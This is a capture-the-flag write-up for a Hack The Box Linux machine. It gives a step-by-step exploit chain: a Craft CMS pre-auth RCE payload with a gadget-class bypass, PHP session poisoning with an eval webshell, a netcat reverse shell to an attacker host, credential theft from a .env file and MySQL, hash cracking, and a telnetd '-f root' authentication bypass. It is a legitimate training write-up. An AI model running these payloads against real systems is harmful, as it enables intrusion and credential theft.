# HTB Orion — Writeup

**Author:** Almighty-Root  
**Difficulty:** Easy  
**OS:** Linux (Ubuntu 22.04)  
**Domain:** `orion.htb`

---

## Summary

Orion runs a Craft CMS 5.6.16 installation behind nginx. The foothold comes from CVE-2025-32432, a pre-auth RCE in Craft's asset transform endpoint — but the standard PoCs fail on this target due to a patched Yii2 version that rejects the naive gadget. The working path uses a `FieldLayoutBehavior/__class` bypass to smuggle `yii\rbac\PhpManager` past the Behavior subclass check, then loads a PHP webshell from a poisoned session file. From `www-data`, database credentials in `.env` lead to a bcrypt hash in MySQL, which cracks to give SSH access as `adam`. Root comes from CVE-2026-24061 — a GNU inetutils telnetd auth bypass where the `USER` env var is passed unsanitized to `login(1)`, allowing `-f root` to skip authentication entirely.

---

## 1. Recon

Standard nmap to start:

```bash
nmap -sCV -A <target-ip> -p- -Pn
```

Two ports:

- `22/tcp` — OpenSSH
- `80/tcp` — nginx 1.18.0, redirecting to `orion.htb`

Added the vhost:

```bash
echo "<target-ip> orion.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Enumeration

Browsing to `http://orion.htb` immediately showed a Yii2 debug error page — full stack trace, file paths, framework versions, all exposed publicly. That told me:

- Debug mode was on in production
- Full web root path: `/var/www/html/craft/web/`
- Yii Framework `2.0.51`
- nginx `1.18.0`

Navigating to `/admin/login` confirmed the CMS: **Craft CMS 5.6.16**.

That version jumped out immediately. I'd seen CVE-2025-32432 — a CVSS 10.0 pre-auth RCE in Craft's asset transform endpoint affecting everything up to 5.6.16. This box was right on the edge of the affected range, patched in 5.6.17.

---

## 3. Initial Access — CVE-2025-32432

### 3.1 Understanding the vulnerability

CVE-2025-32432 lives in `craft\controllers\AssetsController::actionGenerateTransform`, which is registered as `allowAnonymous` (no auth required). It accepts a `POST` parameter `handle` that gets spread into a `Craft::createObject()` call:

```php
$transform = Craft::createObject([
    'class' => ImageTransform::class,
    ...$handle,
]);
```

When `handle` is an associative array under attacker control, keys beginning with `as ` get interpreted by `yii\base\Component::__set()` as behavior attachment, calling `Yii::createObject()` on the attacker-controlled value. Point that at a gadget class with a dangerous `init()` and you have pre-auth RCE.

### 3.2 Why the standard PoCs failed

I tried the Metasploit module first:

```
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set rhosts <target-ip>
set lhost tun0
run
```

The module confirmed the target was vulnerable and leaked the session save path, but the meterpreter session died in an infinite loop on every attempt — a known, never-fully-resolved issue with the staged stager teardown timing on this target.

I then tried the `cd-ratel/CVE-2025-32432` PoC from GitHub, which uses `yii\rbac\PhpManager` as the gadget class. This failed with a different error:

```
yii\base\InvalidConfigException: Class is not of type yii\base\Behavior or its subclasses
```

Yii 2.0.51 had the post-CVE fix already applied: the behavior attachment code now checks that the gadget class is a `Behavior` subclass before instantiating it. Passing `PhpManager` directly — which is not a Behavior — gets rejected. The naive PoC can't work here regardless of CSRF/session state.

### 3.3 The bypass

After digging through independent writeups and the Yii2 source diff, I found the working technique: declare `class` as `craft\behaviors\FieldLayoutBehavior` (a real Behavior subclass — passes the check) but smuggle the actual gadget class via a `__class` key, which Yii still honors during construction. The full payload looks like this in `payload2.json`:

```json
{
  "assetId": 1,
  "handle": {
    "width": 123,
    "height": 123,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "yii\\rbac\\PhpManager",
      "__construct()": [{"itemFile": "/var/lib/php/sessions/sess_PLACEHOLDER"}]
    }
  }
}
```

`yii\rbac\PhpManager`'s `init()` calls `load()` which calls `loadFromFile($this->itemFile)`, which does a literal `require $file`. Point `itemFile` at any PHP-parseable file we control and it executes.

### 3.4 The write primitive — session poisoning

Rather than nginx log poisoning (which requires specific nginx config to be parseable as PHP), I used PHP session file poisoning:

Craft writes session data to `/var/lib/php/sessions/sess_<CraftSessionId>` when handling login redirects. By embedding a PHP payload in a URL parameter during a request that triggers a redirect, Craft's session handler writes the payload into the session file on disk.

### 3.5 Full exploitation chain

**Step 1 — Poison a session file and grab the session ID:**

```bash
CRAFT_SID=$(curl -v -g -s \
  "http://orion.htb/index.php?p=admin/dashboard&a=<?=eval(\$_GET['cmd']);die()?>" \
  -o /dev/null 2>&1 | grep -i 'set-cookie' | grep -oP 'CraftSessionId=\K[^\s;]+')
echo "SID: $CRAFT_SID"
```

**Step 2 — Grab a CSRF token and cookies:**

```bash
curl -s -c cookies.txt http://orion.htb/admin/login -o login.html
CSRF=$(grep -oP 'csrfTokenValue":"\K[^"]+' login.html)
echo "CSRF: $CSRF"
```

**Step 3 — Patch the session ID into payload2.json:**

```bash
sed -i "s|sess_PLACEHOLDER|sess_${CRAFT_SID}|g" payload2.json
grep itemFile payload2.json
```

**Step 4 — Verify RCE:**

```bash
curl -g -s -b cookies.txt \
  -H "X-CSRF-Token: $CSRF" \
  -H "Content-Type: application/json" \
  -X POST 'http://orion.htb/index.php?p=actions/assets/generate-transform&cmd=system("id");' \
  -d @payload2.json -o response.html
cat response.html
```

Output confirmed: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

**Step 5 — Reverse shell:**

```bash
B64=$(echo -n 'rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/bash -i 2>&1|nc <kali-ip> 4445 >/tmp/g' | base64 -w0)

curl -g -s -b cookies.txt \
  -H "X-CSRF-Token: $CSRF" \
  -H "Content-Type: application/json" \
  -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform&cmd=system(base64_decode('${B64}'));" \
  -d @payload2.json -o /dev/null
```

Shell landed as **`www-data`**.

### 3.6 Shell stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. Lateral Movement — `www-data` → `adam`

### 4.1 Reading .env

First thing I checked was the Craft `.env` file:

```bash
cat /var/www/html/craft/.env
```

```
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=<db-password>
```

MySQL running locally with root credentials. Tried `su root` with that password — no luck, it's only the DB password. But I could query the database directly.

### 4.2 Dumping the users table

```bash
mysql -u root -p<db-password> orion -e "select username,email,password from users;"
```

```
username  email           password
admin     adam@orion.htb  <hash>
```

The email `adam@orion.htb` suggested a system user called `adam`. The password was a bcrypt hash (`$2y$13$` — cost 13).

### 4.3 Cracking the hash

```bash
echo '<hash>' > hash.txt
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Cracked in ~42 seconds.

### 4.4 SSH as adam

```bash
ssh adam@orion.htb
```

```
adam@orion:~$ cat user.txt
<flag>
```

---

## 5. Privilege Escalation — `adam` → `root`

### 5.1 Enumeration

`sudo -l` gave nothing — `adam` had no sudo rights. I ran SUID enumeration:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Three binaries immediately stood out:

```
-rwsr-xr-x  1 root root  341784 Mar  6 2026  /usr/bin/rcp
-rwsr-xr-x  1 root root  240832 Mar  6 2026  /usr/bin/rlogin
-rwsr-xr-x  1 root root  225504 Mar  6 2026  /usr/bin/rsh
```

The ancient r-services (`rcp`, `rlogin`, `rsh`) all SUID root and all touched on the same date — March 6 2026, same as the Craft install. That's intentional. These are GNU inetutils binaries, and I'd recently read about CVE-2026-24061 — an auth bypass in GNU inetutils telnetd.

### 5.2 Confirming the telnet service

```bash
netstat -tulnp 2>/dev/null | grep -E '23|513|514'
telnet --version
```

```
tcp  0  0  127.0.0.1:23  0.0.0.0:*  LISTEN  -
telnet (GNU inetutils) 2.7
```

Telnetd listening on loopback only, version 2.7. CVE-2026-24061 confirmed applicable.

### 5.3 The vulnerability

CVE-2026-24061 is an authentication bypass in GNU inetutils telnetd. The `USER` environment variable is passed unsanitized to `login(1)`. Setting it to `-f root` passes that as a flag to `login`, which interprets `-f` as "pre-authenticated" and skips the password check entirely, logging in directly as the specified user.

### 5.4 Root

```bash
USER="-f root" telnet -a 127.0.0.1
```

```
root@orion:~# cat root.txt
<flag>
```

---

## Root Cause Summary

| Stage | Root Cause |
|---|---|
| Initial access | CVE-2025-32432 — Craft CMS `actionGenerateTransform` spreads attacker-controlled `handle` into `Craft::createObject()`, enabling PHP execution via `PhpManager` gadget loaded through a poisoned session file |
| Lateral movement | Database credentials in world-readable `.env` → bcrypt hash in MySQL → weak password in rockyou |
| Privilege escalation | CVE-2026-24061 — GNU inetutils 2.7 telnetd passes `USER` env var unsanitized to `login(1)`, allowing `-f root` to bypass authentication |

---

## Tools Used

- `nmap`
- `curl` (manual exploit chain)
- `john`
- `mysql`
- `netcat`
- `ssh`

---

*Writeup by Gr4ndm4st3r*
